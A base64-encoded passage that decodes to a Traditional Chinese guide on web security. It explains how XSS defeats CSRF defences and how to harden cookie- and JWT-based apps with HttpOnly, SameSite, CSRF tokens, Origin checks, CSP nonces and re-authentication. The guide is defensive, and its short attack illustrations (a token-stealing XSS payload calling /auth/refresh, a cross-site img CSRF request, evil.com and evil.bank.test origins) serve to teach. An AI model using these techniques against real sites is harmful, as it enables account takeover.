h55qE5bCx5b6X6Yed5bCN5YCL5YilIGFwcCDkuIvlt6XlpKvjgIIKLSAqKuWIhumggeS4gOmXnO+8jHRva2VuIOWwsei3n+iRl+a2iOWkseOAgioqIHBheWxvYWQg5b+F6aCI5ZyoIHRva2VuIOmChOWcqOiomOaGtumrlOijoeeahOaZguWAmeWft+ihjOOAgmBsb2NhbFN0b3JhZ2VgIOeahCB0b2tlbiDlrZjlnKjno4Hnop/kuIrvvIzph43mlrDmlbTnkIbjgIHph43plovngI/opr3lmajpg73pgoTlnKjvvIzmiYDku6XkuYvlvozmiY3ln7fooYznmoQgWFNT77yM5bCx566X6ZqU5LqG5aW95bm+5aSp77yM6YKE5piv5om+5b6X5Yiw5a6D44CCCgrkuI3pgY7pgJnmr5QgYEh0dHBPbmx5YCDlvLHjgIJgSHR0cE9ubHlgIGNvb2tpZSDlrozlhajoroDkuI3liLDvvJvoqJjmhrbpq5Too6HnmoQgdG9rZW4g5LiA5pem6KKrIHBheWxvYWQg6K6A5Yiw77yM5bCx6IO95YKz5Yiw5pS75pOK6ICF55qEIHNlcnZlcu+8jOWcqOS7u+S9leijnee9ruS4iumHjeaUvu+8jOebtOWIsOmBjuacn+OAgumAmeaZguWPquWJqSB0b2tlbiDnmoTmnInmlYjmnJ/pmZDog73pmZDliLbmkI3lrrPvvIzmiYDku6XmiY3mnIPnlKjnn63mlYjnmoQgYWNjZXNzIHRva2Vu77yINSDliLAgMTUg5YiG6ZCY77yJ77yM5YaN5oqK6ZW35pWI55qEIHJlZnJlc2ggdG9rZW4g5pS+5ZyoIEh0dHBPbmx5IGNvb2tpZSDoo6HvvIzpgJnmqKPlgbfliLDnmoQgYWNjZXNzIHRva2VuIOWPquiDveeUqOW5vuWIhumQmOOAguS4jemBjuWPquimgSBwYXlsb2FkIOmChOWcqOWft+ihjO+8jOWug+WwseiDveiHquW3seWRvOWPqyBgL2F1dGgvcmVmcmVzaGDjgILngI/opr3lmajmnIPoh6rli5XluLbkuIogcmVmcmVzaCBjb29raWXvvIzmiYDku6UgcGF5bG9hZCDmr4/lkbzlj6vkuIDmrKHvvIzlsLHmi7/liLDkuIDlgIvmlrDnmoQgYWNjZXNzIHRva2VuIOWPr+S7peWCs+WHuuWOu+OAguimgeetiSBwYXlsb2FkIOWBnOS4i+S+hu+8jOacgOW+jOWCs+WHuuWOu+eahOmCo+WAiyB0b2tlbiDmiY3mnIPlnKjlub7liIbpkJjlhaflpLHmlYjjgILlj5flrrPogIXpl5zmjonliIbpoIHkuYvlvozvvIzmlLvmk4rogIXlsLHmj5vkuI3liLDmlrDnmoQgYWNjZXNzIHRva2VuIOS6huOAguWboOeCuiByZWZyZXNoIHRva2VuIOWcqCBIdHRwT25seSBjb29raWUg6KOh77yM5LuW6K6A5LiN5Yiw77yM5Y+q6IO96YCP6YGO5Y+X5a6z6ICF6ZaL6JGX55qE5YiG6aCB5Y675ZG85Y+rIGAvYXV0aC9yZWZyZXNoYOOAguWPjemBjuS+hu+8jOWmguaenCByZWZyZXNoIHRva2VuIOaUvuWcqCBKUyDoroDlvpfliLDnmoTlnLDmlrnvvIzooqvlgbfotbDkuYvlvozvvIzmlLvmk4rogIXlj6/ku6XkuIDnm7Toh6rlt7Hmj5vmlrDnmoQgYWNjZXNzIHRva2Vu77yM55u05YiwIHJlZnJlc2ggdG9rZW4g6YGO5pyf77yM5Y+X5a6z6ICF6Zec5LiN6Zec5YiG6aCB6YO95LiA5qij44CCCgo8L2RldGFpbHM+CgotLS0KCiMjIENTUkYg55qE6Ziy57ea77yM5LiA5bGk5LiA5bGk55yLCgoqKuiugOmAmeaVtOW8teihqOaZgu+8jOWFiOWBh+iorSBYU1Mg5bey57aT6Ziy5L2P5LqG44CCKiog6YCZ6KOh5bm+5LmO5q+P5LiA6YGTIENTUkYg6Ziy57ea77yM5Zyo5pS75pOK6ICF6IO95YGaIFhTUyDkuYvlvozpg73mnIPlpLHmlYjvvIzlm6DngrogWFNTIOaYr+S7peS9oOiHquW3seeahCBvcmlnaW4g6Lqr5YiG5Z+36KGM77yM6IO955u05o6l6K6AIHRva2Vu44CBRE9NIOi3n+mggemdoueLgOaFi+OAguacgOW+jOS4gOashOOAjFhTUyDpgLLkvobkuYvlvozpgoTmnInnlKjll47vvJ/jgI3lsLHmmK/miorpgJnlsaTkvp3os7Tlr6vlh7rkvobjgIIKCnwg5bGkIHwg6Kqw6LKg6LKsIHwg5YGa5LuA6bq8IHwgWFNTIOmAsuS+huS5i+W+jOmChOacieeUqOWXju+8nyB8CnwtLS18LS0tfC0tLXwtLS18CnwgYFNhbWVTaXRlYCBjb29raWUgfCBCcm93c2VyICsgU2VydmVyIHwgYFNldC1Db29raWU6IC4uLjsgU2FtZVNpdGU9TGF4YOOAguWWruWtkOWmguaenOaYr+W+nuWIpeeahOe2suermemBnuS+hueahO+8jOi3keiFv+eahOS6uuWwseS4jeS6rumRsOWMmeOAguS+i+WkluaYr+S9oOWcqOWIpeeahOe2suermem7nuS6humAo+e1kO+8jOaVtOWAi+WIhumggeaPm+aIkOS9oOeahOe2suerme+8jOiAjOS4lOeUqOeahOaYryBHRVTjgILot6jnq5nnmoQgc3ViLXJlc291cmNlIHJlcXVlc3Qg6Lef6Leo56uZ55qEIGZvcm0gUE9TVCDpg73kuI3mnIPluLYgY29va2ll44CCQ2hyb21lIOW+niBDaHJvbWUgODDvvIgyMDIwIOW5tO+8iei1t+aKiuaykuWvqyBgU2FtZVNpdGVgIOeahCBjb29raWUg55W25oiQIGBMYXhg77yMRmlyZWZveCDot58gU2FmYXJpIOaykuacie+8jOaJgOS7peimgeaYjueiuuWvq+WHuuS+huOAgiB8IOaykueUqOOAglhTUyDlnKjlkIzkuIDlgIsgc2l0ZSDoo6Hln7fooYzvvIxjb29raWUg54Wn5bi45bi25LiK44CCIHwKfCBgU2FtZVNpdGU9U3RyaWN0YCB8IFNlcnZlciB8IGBTZXQtQ29va2llOiAuLi47IFNhbWVTaXRlPVN0cmljdGDjgILlsLHpgKPlvp7liKXnmoTntrLnq5npu57pgKPntZDpgLLkvobvvIznrKzkuIDlgIsgcmVxdWVzdCDkuZ/kuI3luLYgY29va2ll44CC55So5Zyo566h55CG5b6M5Y+w44CB6Lef6Yyi5pyJ6Zec55qEIGVuZHBvaW5044CCIHwg5rKS55So77yM55CG55Sx5ZCM5LiK44CCIHwKfCBDU1JGIHRva2VuIHwgQ2xpZW50ICsgU2VydmVyIHwg5Y+q5Y2w5Zyo5L2g6Ieq5bex5Zau5a2Q5pys5LiK55qE5pqX6Jmf44CCc2VydmVyIOWcqCBmb3JtIOaIliByZXNwb25zZSDoo6HmlL7kuIDlgIvpmqjmqZ8gdG9rZW7vvIzmnIPmlLnororni4DmhYvnmoQgcmVxdWVzdCDpg73opoHmiorlroPpgIHlm57kvobjgIJgZXZpbC5jb21gIOiugOS4jeWIsOS9oOeahOmggemdou+8jOWboOeCuuWQjOa6kOaUv+etlu+8iHNhbWUtb3JpZ2luIHBvbGljee+8jFNPUO+8ieS4jeiuk+S4gOWAiyBvcmlnaW4g6K6A5Y+m5LiA5YCLIG9yaWdpbiDnmoQgcmVzcG9uc2XvvIzmiYDku6XlroPkuZ/lsLHnhKHms5Xlgb3pgKDpgJnlgIsgdG9rZW7jgIIgfCDmspLnlKjjgIJYU1Mg55u05o6l5b6eIERPTSDoroDlh7ogdG9rZW4g5LiA6LW36YCB44CCIHwKfCBgT3JpZ2luYCAvIGBSZWZlcmVyYCDmqqLmn6UgfCBTZXJ2ZXIgfCDllq7lrZDkuIrlr6vokZflroPmmK/lvp7lk6rlgIvntrLnq5npgZ7lh7rkvobnmoTjgILngI/opr3lmajmnIPlnKggUE9TVCByZXF1ZXN0IOWKoOS4iiBgT3JpZ2luYCBoZWFkZXLjgILpgIHliLAgYC90cmFuc2ZlcmAg55qEIHJlcXVlc3Qg6KaB5piv5bi26JGXIGBPcmlnaW46IGh0dHBzOi8vZXZpbC5jb21g77yM5bCx5ouS57WV44CCIHwg5rKS55So44CCWFNTIOmAgeWHuueahCByZXF1ZXN0IOW4tueahOaYr+S9oOecn+ato+eahCBgT3JpZ2luYOOAgiB8Cnwg54WnIEhUVFAgbWV0aG9kIOeahOiqnuaEj+i1sCB8IFNlcnZlciB8IEdFVCDmsLjpgaDkuI3mlLnororni4DmhYvjgILlnJbniYcgdGFnIOWPquiDveeZvCBHRVTvvIznmbzkuI3kuoYgUE9TVO+8jOaUu+aTiuiAheWwseW+l+WkmuWvq+S4gOm7nuadseilv+OAgiB8IOaykueUqOOAglhTUyDku4DpurwgbWV0aG9kIOmDveiDveeUqOOAgiB8Cnwg5LiN55SoIGNvb2tpZSB8IOaetuaniyB8IEpXVCDmlL7lnKggYEF1dGhvcml6YXRpb25gIGhlYWRlcuOAguS4jeacg+iiq+iHquWLleW4tuS4iu+8jOS5n+WwseaykuaciSBDU1JGIOeahOWVj+mhjOOAgiB8IOaykueUqO+8jOiAjOS4lOabtOezn+OAguaUvuWcqCBgbG9jYWxTdG9yYWdlYCDnmoQgSldU77yMWFNTIOS4gOihjOWwseiDveiugOi1sOOAgiB8Cnwg5pWP5oSf5pON5L2c5YmN6YeN5paw6amX6K2JIC8gTUZBIHwgU2VydmVyICsgQ2xpZW50ICsg5L2/55So6ICFIHwg6ZaL5L+d6Zqq566x5LmL5YmN77yM566h55CG5ZOh5YWI5omT6Zu76Kmx5ZWP5L2g5pys5Lq644CC5Zyo6YeN6KaB5pON5L2c5YmN6YeN5paw6Ly45YWl5a+G56K844CB6Ly45YWl6amX6K2J5Zmo55qE5LiA5qyh5oCn5a+G56K877yIVE9UUO+8ie+8jOaIluaMieS4gOS4i+WuieWFqOmHkemRsO+8iFdlYkF1dGhu77yJ44CCIHwgKirpg6jliIbmnInnlKjjgIIqKiBYU1Mg6Ieq5bex6K6K5LiN5Ye65L2g55qE5a+G56K877yM5Lmf5rKS6L6m5rOV5pu/5L2g5oyJ6YeR6ZGw44CC5L2G6aCB6Z2i5Zyo5a6D5omL5LiK77yM5a6D5Y+v5Lul6Lez5Ye65LiA5YCL55yL6LW35L6G5b6I5q2j5bi455qE5o+Q56S677yM562J5L2g6Ieq5bex5aGr44CC6YCZ5pmC5a6D5b6X5YWI6aiZ5Yiw5L2g6YWN5ZCI77yM5rKS6L6m5rOV5YaN5oKE5oKE5a6M5oiQ44CCIHwKCi0tLQoKIyMg54K65LuA6bq8IFhTUyDmr5TovIPopoHnt4oKClhTUyDkuIDpgLLkvobvvIzmiYDmnInluLjopovnmoQgQ1NSRiDpmLLnt5rpg73mnIPlpLHmlYjvvIzkuIrpnaLpgqPlvLXooajnmoTmnIDlvozkuIDmrITlsLHmmK/pgJnlgIvntZDmnpzjgIJPV0FTUCDnmoQgQ1NSRiBjaGVhdCBzaGVldCDnlKjkuIDlj6XoqbHorJvlrozvvJrjgIxDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKSBjYW4gZGVmZWF0IGFsbCBDU1JGIG1pdGlnYXRpb24gdGVjaG5pcXVlcyHjgI3ph43mlrDpqZforYnmmK8gWFNTIOmAsuS+huS5i+W+jOWUr+S4gOmChOacieS9nOeUqOeahOS4gOWxpO+8jOWboOeCuiBYU1Mg5rKS5pyJ5L2g55qE5a+G56K86Lef6YeR6ZGw77yM5b6X5oOz6L6m5rOV6K6T5L2g6Ieq5bex5Lqk5Ye65L6G44CCCgrlr6bpmpvnmoTlhKrlhYjpoIbluo/vvJoKCjEuICoq5YWI6ZiyIFhTU+OAgioqIOahhuaetueahOiHquWLlSBlc2NhcGXjgIFDU1DjgIHlrZjpgLLkvobnmoTlhaflrrnlhYjmuIXpgY7jgIFub3NuaWZm77yM5YaN55SoIGBIdHRwT25seWAg6ZmQ5Yi25pCN5a6z44CCCjIuICoq5YaN55aK5LiKIENTUkYg55qE6Ziy57ea44CCKiogU2FtZVNpdGXjgIF0b2tlbuOAgU9yaWdpbiDmqqLmn6XjgILpgJnkupvlj6rmnInlnKggWFNTIOW3sue2k+mYsuS9j+eahOWJjeaPkOS4i+aJjeacieaEj+e+qeOAggozLiAqKumrmOmiqOmaqueahOaTjeS9nO+8jOWKoOS4iumHjeaWsOmpl+itieaIliBNRkHjgIIqKiBYU1Mg5oiQ5Yqf5LmL5b6M5a6D6YKE5pyJ6bue55So77yM5pS75pOK6ICF5b6X6aiZ5L2g5oyJ5LiL56K66KqN77yM5rKS6L6m5rOV6Ieq5bex5YuV5omL44CCCgotLS0KCiMjIOS+neaetuani+S4gOatpeatpeijnOW8twoK5LiA5qij55qE6Ziy57ea77yM5L6d5p625qeL57WE5ZCI6LW35L6G44CC5q+P5LiA5qKd6Lev57ea6YO95b6e5pyA6Zm95pil55qE54mI5pys6ZaL5aeL77yM5LiA5qyh5Yqg5LiA5bGk44CCCgo8ZGV0YWlscz4KPHN1bW1hcnk+5LiA5q2l5q2l6KOc5by3IGNvb2tpZSBzZXNzaW9uIOeahCBhcHA8L3N1bW1hcnk+CgrpmLIgWFNTIOeahOS4ieaoo+adseilv+imgeWFiOWBmu+8jOW+jOmdoueoseeCuuWcsOWfuu+8mkNTUCBub25jZeOAgeahhuaetueahOiHquWLlSBlc2NhcGXjgIFub3NuaWZm44CCWFNTIOS4gOmAsuS+hu+8jFNhbWVTaXRl44CBQ1NSRiB0b2tlbuOAgU9yaWdpbiDmqqLmn6Xpg73mnIPlpLHmlYjvvIxgSHR0cE9ubHlgIOS5n+WPquiDvemZkOWItuaQjeWus+OAggoK5pei5pyJ55qEIGFwcCDopoHoo5zlvLfvvIzlj6/ku6XnhafkuIvpnaLnrKwgMCDmraXliLDnrKwgNiDmraXnmoTpoIbluo/jgIJDU1Agbm9uY2Ug6KaB5pS55q+P5YCLIHRlbXBsYXRl44CB5qqi5p+l5q+P5pSv56ys5LiJ5pa5IHNjcmlwdO+8jOaYr+acgOiKseW3peWkq+eahOS4gOatpe+8jOaJgOS7peaOkuWIsOesrCA0IOatpe+8jOiuk+S+v+WunOeahOWFiOWBmuOAguS4i+ihqOWIl+WHuuavj+S4gOWxpOeahOaIkOacrOi3n+mYsuempuWDueWAvO+8mgoKfCDlsaQgfCDmiJDmnKwgfCDlg7nlgLwgfAp8LS0tfC0tLXwtLS18CnwgYEh0dHBPbmx5YCArIGBTZWN1cmVgIHwg5ZCE5LiA6KGMIHwg6ZmQ5Yi25pCN5a6z77yM5L2G5LiN5pyD6Zi75q2i5pS75pOKIHwKfCBgbm9zbmlmZmAgfCDkuIDooYwgfCDmk4vmjonkuIDmop0gWFNTIOi3r+W+ke+8muS4iuWCs+eahOaqlOahiOWbnuWCs+aZgueahCBgQ29udGVudC1UeXBlYCDlpoLmnpzkuI3mmK8gSmF2YVNjcmlwdO+8jOeUqCBgPHNjcmlwdCBzcmM+YCDovInlhaXkuZ/kuI3mnIPln7fooYzjgILlvp7lhbbku5blnLDmlrnpgLLkvobnmoQgWFNTIOS4jeWPl+W9semfvyB8CnwgYFNhbWVTaXRlYCB8IOS4gOihjCB8IOaUlOS4i+WFtuS7lue2suermeeZvOi1t+eahOWFuOWeiyBDU1JG77yb5b6e5L2g6Ieq5bex55qEIHN1YmRvbWFpbiDnmbzotbfnmoTmlJTkuI3kuIvkvobvvIzlhbbku5bmlLvmk4rkuZ/mspLnlKggfAp8IENTUkYgdG9rZW4gfCDmr4/lgIsgZm9ybSDpg73opoHmjqUgfCBYU1Mg5LiA6YCy5L6G5bCx5aSx5pWIIHwKfCBDU1Agbm9uY2UgfCDnnJ/mraPopoHmjpLmmYLnqIvnmoTlt6XkvZzvvJpzZXJ2ZXIg5q+P5YCLIHJlcXVlc3Qg55Si55Sf5LiA5YCLIG5vbmNl77yM5q+P5YCLIHRlbXBsYXRlIOmDveimgeaUvumAsuWOu++8jOavj+aUr+esrOS4ieaWuSBzY3JpcHQg6YO96KaB5qqi5p+l6YGO44CC5ryP5o6J5LiA5YCL77yM6aCB6Z2i5bCx5aOe5LqGIHwg5pW057WE6KOh5YO55YC85pyA6auY55qE44CC5a6D6K6T5aGe6YCy5L6G55qEIHNjcmlwdCDmoLnmnKzkuI3mnIPln7fooYzvvIzogIwgWFNTIOato+aYr+iDveepv+mBjuWFtuS7luavj+S4gOWxpOeahOmCo+eoruaUu+aTiiB8Cgrml6LmnInnmoQgYXBwIOmAmeaoo+aOku+8jOaYr+eCuuS6huijnOW8t+aZguS4jeaKiuadseilv+W8hOWjnuOAguaYguiytOS9huWDueWAvOmrmOeahCBDU1DvvIznrYnmjpLlvpflh7rmmYLplpPlho3lgZrjgIIKCioqMC4g5LuA6bq86YO95rKS6Kit55qEIGNvb2tpZeOAgioqIOWFqOmDqOaatOmcsuWcqOWklu+8mlhTUyDoroDlvpfliLDvvIxDU1JGIOeUqOW+l+WIsO+8jOmChOeUqOaYjuaWh+WCs+mAgeOAggoKYGBgClNldC1Db29raWU6IHNlc3Npb249YWJjMTIzCmBgYAoKKioxLiDlhYjmioogY29va2llIOmOlui1t+S+hu+8jOmghuaJi+WKoOS4iumCo+WAi+WFjeiyu+eahCBoZWFkZXLjgIIqKiBgSHR0cE9ubHlgIOiukyBKUyDoroDkuI3liLDlroPvvIxgU2VjdXJlYCDorpPlroPkuI3otbDmmI7mlofnmoQgSFRUUOOAgmBub3NuaWZmYCDlj6ropoHkuIDooYzvvIzmlL7lnKjpgJnkuIDmibnkuIDotbflgZrvvIzpm5bnhLblroPpmLLnmoTmmK/nrKwgNCDmraXorJvnmoQgc2NyaXB0IOWft+ihjOmCo+S4gOWxpOOAggoKYGBgClNldC1Db29raWU6IHNlc3Npb249YWJjMTIzOyBIdHRwT25seTsgU2VjdXJlOyBQYXRoPS8KWC1Db250ZW50LVR5cGUtT3B0aW9uczogbm9zbmlmZgpgYGAKClhTUyDmspLovqbms5Xlho3mioogY29va2llIOWCs+WHuuWOu+S6huOAguS9huWug+mChOaYr+WPr+S7peWcqOmggemdouijoSrkvb/nlKgq6YCZ5YCLIHNlc3Npb27vvIzmiYDku6XpgJnkuIDmraXlj6rmmK/muJvlsJHmkI3lrrPvvIzllY/poYzpgoTlnKjjgIIKCioqMi4g55SoIGBTYW1lU2l0ZWAg5pSU5LiL5YW45Z6L55qEIENTUkbjgIIqKiDot6jnq5nnmoQgc3ViLXJlc291cmNlIHJlcXVlc3TvvIjlsLHmmK8gYDxpbWcgc3JjPSJiYW5rLmNvbS90cmFuc2ZlciI+YCDpgqPkuIDmi5vvvInot5/ot6jnq5nnmoQgZm9ybSBQT1NU77yM6YO95LiN5pyD5YaN5bi2IGNvb2tpZeOAgkNocm9tZSDmnKzkvoblsLHmiormspLlr6vnmoQgY29va2llIOeVtuaIkCBgTGF4YO+8jOS9huaYjueiuuWvq+WHuuS+hu+8jOS5n+iDvemXnOaOiSBDaHJvbWUg6YKj5YWp5YiG6ZCY55qEIFBPU1Qg5L6L5aSW77yM6ICM5LiUIEZpcmVmb3gg6LefIFNhZmFyaSDkuZ/mnIPnhafkuIDmqKPnmoTopo/liYfotbDjgIIKCmBgYApTZXQtQ29va2llOiBzZXNzaW9uPWFiYzEyMzsgSHR0cE9ubHk7IFNlY3VyZTsgU2FtZVNpdGU9TGF4OyBQYXRoPS8KYGBgCgrnrqHnkIblvozlj7Dot5/ot5/pjKLmnInpl5znmoQgZW5kcG9pbnQg55SoIGBTYW1lU2l0ZT1TdHJpY3Rg44CCCgoqKjMuIOWcqOacg+aUueiuiueLgOaFi+eahCByZXF1ZXN0IOS4iuWKoCBDU1JGIHRva2VuKirvvIzlm6DngrogYFNhbWVTaXRlYCDmnInmvI/mtJ7jgILjgIxzaXRl44CN5oyH55qE5pivIHNjaGVtZSDliqDkuIrlj6/oqLvlhorntrLln5/vvIhyZWdpc3RyYWJsZSBkb21haW7vvInvvIzmiYDku6UgYGh0dHBzOi8vZXZpbC5iYW5rLmNvbWAg6LefIGBodHRwczovL2JhbmsuY29tYCDmmK/lkIzkuIDlgIsgc2l0ZeOAguWmguaenOacieS4gOWAiyBzdWJkb21haW4g6JC95Zyo5Yil5Lq65omL5LiK77yI6KKr5o6l566h55qE5bui5qOEIHN1YmRvbWFpbuOAgeaUvuS9v+eUqOiAheWFp+WuueeahCBob3N077yJ77yM5a6D6IO96YCa6YGO5q+P5LiA56iuIGBTYW1lU2l0ZWAg5qqi5p+l44CC5a+m5ris5pmC77yMYGV2aWwuYmFuay50ZXN0YCDkuIrnmoQgYDxpbWc+YCDot58gZm9ybSBQT1NU77yM5ZyoIENocm9tZSDot58gRmlyZWZveCDpg73luLbkuIrkuoYgYGJhbmsudGVzdGAg5qiZ5oiQIGBTdHJpY3RgIOeahCBjb29raWXjgILkuI3pgY4gYE9yaWdpbmAgaGVhZGVyIOWvq+eahOmChOaYryBgaHR0cHM6Ly9ldmlsLmJhbmsudGVzdGDvvIzmiYDku6XnrKwgNSDmraXlnKjpgJnoo6HnlKjlvpfkuIrjgILlj6blpJbvvIzliKXnmoTntrLnq5npgKPliLDkvaDnmoTmn5DlgIsgR0VUIOe2suWdgOaZgu+8jGBMYXhgIOmChOaYr+acg+W4tiBjb29raWXvvIzmiYDku6XmnIPmlLnororni4DmhYvnmoQgR0VUIOS4gOaoo+aciemiqOmaquOAggoKYGBgaHRtbAo8Zm9ybSBhY3Rpb249Ii90cmFuc2ZlciIgbWV0aG9kPSJQT1NUIj4KICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjc3JmX3Rva2VuIiB2YWx1ZT0ie3sgY3NyZlRva2VuIH19Ij4KPC9mb3JtPgpgYGAKCmBgYGpzCi8vIHNlcnZlcu+8jOaUtuWIsCBQT1NUIOaZguOAguWFqemCiumDveimgeWFiOeiuuiqjeacieWAvO+8mnVuZGVmaW5lZCAhPT0gdW5kZWZpbmVkIOaYryBmYWxzZe+8jAovLyDkuI3mqqLmn6XnmoToqbHvvIxzZXNzaW9uIOaykuaciSB0b2tlbuOAgXJlcXVlc3Qg5Lmf5rKS5bi2IHRva2Vu77yM5bCx5pyD55u05o6l6YCa6YGO44CCCmlmICghc2Vzc2lvbi5jc3JmVG9rZW4gfHwgcmVxLmJvZHkuY3NyZl90b2tlbiAhPT0gc2Vzc2lvbi5jc3JmVG9rZW4pIHJldHVybiByZXMuc3RhdHVzKDQwMykuZW5kKCkKYGBgCgoqKjQuIOaKiuWcsOWfuuWvq+WHuuS+huOAgioqIENTUCBub25jZSDot5/moYbmnrbnmoToh6rli5UgZXNjYXBl77yIYG5vc25pZmZgIOesrCAxIOatpeW3sue2k+WKoOS6hu+8ieOAgumAmeWwseaYr+mWi+mgreism+eahOWcsOWfuuOAguWmguaenOS9oOaYr+aWsOWwiOahiO+8jOWBmuWIsOmAmeijoeaZgumAmeS4gOmgheaXqeWwseWujOaIkOS6hu+8jOWJjemdouW5vuatpeaYr+S5i+W+jOaJjeijnOS4iueahOS+v+WunOWfuuacrOWKn+OAggoKYGBgCkNvbnRlbnQtU2VjdXJpdHktUG9saWN5OiBzY3JpcHQtc3JjICdzZWxmJyAnbm9uY2UtUkFORE9NJwpgYGAKCmBgYGpzeAo8ZGl2Pnt1c2VySW5wdXR9PC9kaXY+ICAgLy8g5a6J5YWo77yM5qGG5p625pyD5bmr5L2gIGVzY2FwZQovLyDmsLjpgaDkuI3opoHmiorkvb/nlKjogIXnmoTos4fmlpnkuJ/ntaYgZGFuZ2Vyb3VzbHlTZXRJbm5lckhUTUwgLyB2LWh0bWwgLyBpbm5lckhUTUwKYGBgCgoqKjUuIOaLkue1leWkluS+hueahCBgT3JpZ2luYCoq77yM55So5Zyo5pyD5pS56K6K54uA5oWL55qE6Lev55Sx5LiK44CC5L6/5a6c55qE56ys5LqM5bGk44CC5a+m5ris5pmC77yM54CP6Ka95Zmo5Zyo5q+P5YCLIFBPU1Qg5LiK6YO96YCB5LqGIGBPcmlnaW5g77yM5ZCMIG9yaWdpbiDnmoQgZm9ybSDot58gYGZldGNoYCDkuZ/kuIDmqKPvvIzogIzkuIDoiKznmoQgR0VUIOaykuaciemAge+8jOaJgOS7peimgeWcqOacg+aUueiuiueLgOaFi+eahCBtZXRob2Qg5LiK5qqi5p+l44CCUE9TVCDmspLluLYgYE9yaWdpbmDvvIzkuI3ku6PooajlroPlsLHmmK/kvaDoh6rlt7HpgIHnmoTvvIzpgJnmrrXmqqLmn6XkuZ/mnIPmi5LntZXlroPjgIIKCmBgYGpzCmlmIChyZXEubWV0aG9kID09PSAnUE9TVCcgJiYgcmVxLmhlYWRlcnMub3JpZ2luICE9PSAnaHR0cHM6Ly9iYW5rLmNvbScpIHJldHVybiByZXMuc3RhdHVzKDQwMykuZW5kKCkKYGBgCgoqKjYuIOWNsemaqueahOaTjeS9nOimgemHjeaWsOmpl+itieOAgioqIOi9ieW4s+OAgeaUuSBlbWFpbOOAgeWIquW4s+iZn++8jOmDveimgemHjeaWsOi8uOWFpeWvhueivOaIluaMieS4gOS4i+WuieWFqOmHkemRsOOAglhTUyDpgLLkvobkuYvlvozvvIzlj6rlianpgJnkuIDlsaTpgoTpnIDopoHkvaDmnKzkurrpu57poK3jgIIKCjwvZGV0YWlscz4KCjxkZXRhaWxzPgo8c3VtbWFyeT7oo5zlvLcgSldUIOeahCBhcHDvvIzlhYjmiZPlnLDln7o8L3N1bW1hcnk+Cgrli5UgdG9rZW4g5LmL5YmN77yM5YWI5oqK5Zyw5Z+65omT5aW944CCdG9rZW4g5pS+5Zyo5ZOq6KOh77yI5LiL6Z2i55qEIEHjgIFC44CBQ++8ieWPquiDveWcqCBYU1Mg5bey57aT6YCy5L6G5LmL5b6M5rib5bCR5pCN5a6z77yM5Y+q5pyJ5LiA5bGk6IO95LiA6ZaL5aeL5bCx5LiN6K6TIFhTUyDpgLLkvobvvIzmiYDku6XlroPmjpLnrKzkuIDjgIIKCioqRC4g5Zyw5Z+677ya6K6TIFhTUyDmoLnmnKzkuI3mnIPln7fooYzjgIIqKiBDU1Agbm9uY2XjgIHmoYbmnrbnmoToh6rli5UgZXNjYXBl44CBbm9zbmlmZu+8jOaVj+aEn+aTjeS9nOWJjemHjeaWsOmpl+itieOAguS4gOWAi+aKiiB0b2tlbiDmlL7lnKggYGxvY2FsU3RvcmFnZWDjgIHkvYYgQ1NQIOioreW+l+W+iOWujOaVtOeahCBhcHDvvIzlj6/og73mr5QgdG9rZW4g5pS+5b6X5b6I6Kyb56m244CB5Y275rKS5pyJIENTUCDnmoQgYXBwIOWuieWFqO+8jOWboOeCuuW+jOiAhemChOaYr+iuk+WhnumAsuS+hueahCBzY3JpcHQg5Z+36KGM44CC6YCZ5piv5ZSv5LiA6IO95LiN6K6T5pS75pOK6ICF6YCy5L6G44CB6ICM5LiN5Y+q5piv5rib5bCR5pCN5a6z55qE5LiA5bGk44CCCgpgYGAKQ29udGVudC1TZWN1cml0eS1Qb2xpY3k6IHNjcmlwdC1zcmMgJ3NlbGYnICdub25jZS1SQU5ET00nClgtQ29udGVudC1UeXBlLU9wdGlvbnM6IG5vc25pZmYKYGBgCgrmjqXokZfmsbrlrpogdG9rZW4g5pS+5ZOq6KOh44CC6YCZ5bm+6aCF55So5a2X5q+N57eo6Jmf77yM5LiN5YOP5YmN6Z2iIGNvb2tpZSDpgqPmop3nlKjmlbjlrZfvvIzlm6Dngrrlj6rog73pgbjkuIDlgIvvvIzkuI3mmK/lhajpg6jpg73lgZrjgIJB44CBQuOAgUMg6YO95Zyo5Zue562U44CMdG9rZW4g5pS+5Zyo5ZOq6KOh44CN6YCZ5YCL5ZWP6aGM77yM5b6M5LiA5YCL5Y+W5Luj5YmN5LiA5YCL44CC6IO95YGa5Yiw5ZOq5LiA5YCL77yM5bCx6YG45pyA5b6M6Z2i6YKj5YCL44CCCgoqKkEuIFRva2VuIOaUviBgbG9jYWxTdG9yYWdlYOOAgioqIOacgOezn+OAglhTUyDkuIDooYzlsLHlgbfotbDvvIzogIzkuJTlnKjpgY7mnJ/liY3og73lvp7ku7vkvZXoo53nva7ph43mlL7jgIIKCmBgYGpzCmxvY2FsU3RvcmFnZS5zZXRJdGVtKCd0b2tlbicsIGp3dCkgICAvLyDkuI3opoHpgJnmqKPlgZoKYGBgCgoqKkIuIFRva2VuIOaUvuiomOaGtumrlOOAgioqIOS4gOWAiyBtb2R1bGUg6K6K5pW45oiWIHN0b3Jl77yM5LiN5a+r6YCy5Lu75L2V5YSy5a2Y56m66ZaT44CC5YiG6aCB5LiA6Zec5a6D5bCx5raI5aSx77yM5LmL5b6M5omN5Z+36KGM55qEIFhTUyDku4Dpurzpg73mib7kuI3liLDjgILkvYbliIbpoIHplovokZfnmoTmmYLlgJnln7fooYznmoQgWFNTIOmChOaYr+iugOW+l+WIsO+8jOS5n+iDveaKiuWug+WCs+WHuuWOu++8jOaUu+aTiuiAheaLv+WIsOeahCB0b2tlbiDlnKjpgY7mnJ/liY3pg73og73nlKjjgILlj5bku6MgQeOAggoKYGBganMKbGV0IGFjY2Vzc1Rva2VuID0gbnVsbApmdW5jdGlvbiBzZXRUb2tlbih0KSB7IGFjY2Vzc1Rva2VuID0gdCB9CmBgYAoKKipDLiDnn63mlYjnmoQgYWNjZXNzIHRva2VuIOaUvuiomOaGtumrlO+8jHJlZnJlc2ggdG9rZW4g5pS+IGBIdHRwT25seWAgY29va2ll44CCKiogYWNjZXNzIHRva2VuIOWcqOiomOaGtumrlOiuiuaVuOijoeWPqueUqCA1IOWIsCAxNSDliIbpkJjvvJtyZWZyZXNoIHRva2VuIOaUvuWcqCBKUyDmsLjpgaDoroDkuI3liLDnmoTlnLDmlrnjgILlj5bku6MgQuOAggoKYGBgClNldC1Db29raWU6IHJlZnJlc2g9Li4uOyBIdHRwT25seTsgU2VjdXJlOyBTYW1lU2l0ZT1TdHJpY3Q7IFBhdGg9L2F1dGgvcmVmcm